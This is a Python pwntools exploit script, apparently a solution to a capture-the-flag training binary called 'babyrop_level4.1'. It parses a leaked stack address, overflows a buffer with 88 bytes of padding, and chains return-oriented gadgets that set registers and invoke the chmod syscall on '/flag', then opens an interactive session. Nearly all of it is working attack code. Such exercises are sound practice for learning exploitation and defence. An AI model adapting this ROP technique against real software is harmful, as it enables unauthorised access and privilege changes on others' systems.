from pwn import *

binary = "/challenge/babyrop_level4.1"
e = context.binary = ELF(binary)

p = process("./babyrop_level4.1")
p.recvuntil("0x")
stack_addr = int(p.recv(12), 16)     # stack leak
info(f"[LEAK] {hex(stack_addr)}")

# chmod(rdi=filename, rsi=mode)
chain = b'A'*88
chain += p64(0x00401c5a)            # pop rdi ; ret
chain += p64(stack_addr + 88 + 24)  # address of "/flag" on the sta>
chain += p64(0x00401016)            # add rsp, 8 to skip our data
chain += b'/flag\0\0\0'
chain += p64(0x00401c4a)            # pop rsi ; ret
chain += p64(0b111)
chain += p64(0x00401c2a)            # pop rdx ; ret
chain += p64(0x0)
chain += p64(0x00401c42)            # pop rax ; ret
chain += p64(0x5A)                  # chmod syscall
chain += p64(0x00401c62)            # syscall
chain += p64(0x0040101a)            # ret

p.sendline(chain)
p.interactive()
